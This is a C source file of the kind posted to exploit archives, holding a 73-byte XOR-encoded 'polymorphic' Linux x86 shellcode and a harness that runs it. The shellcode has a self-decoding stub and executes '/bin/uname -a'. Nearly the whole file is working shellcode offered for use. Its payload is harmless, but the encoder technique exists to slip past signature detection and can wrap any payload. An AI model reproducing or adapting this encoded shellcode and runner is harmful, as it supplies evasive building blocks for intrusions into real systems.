/*
 * sys_execve("/bin/uname", { "/bin/uname", "-a" }, NULL) 73 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char encoded_uname[] = "\xeb\x0d\x5e\x31\xc9\xb1\x35\x80\x36\x72"
		       "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
                       "\x43\xb2\xf1\x9e\x73\xfa\x76\x56\x14\x1a"
                       "\x5f\x13\xfb\x94\xf1\x9e\x73\xfa\x76\x56"
                       "\x1a\x1c\x13\x1f\x17\x1a\x1b\x1c\x5d\x07"
                       "\x14\x1a\x5d\x10\xfb\x91\x22\x24\x21\xc2"
                       "\x79\xfb\x93\x43\xa0\xbf\xf2\x43\xb2\xc2"
                       "\x73\xbf\xf2";

int main(void) {
  int uname_len = strlen(encoded_uname);
  printf("[+] Using key mutation engine : 0x72\n");
  printf("[+] Length of this shellcode is : %d bytes\n\n", uname_len);
  (*(void(*)())encoded_uname)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */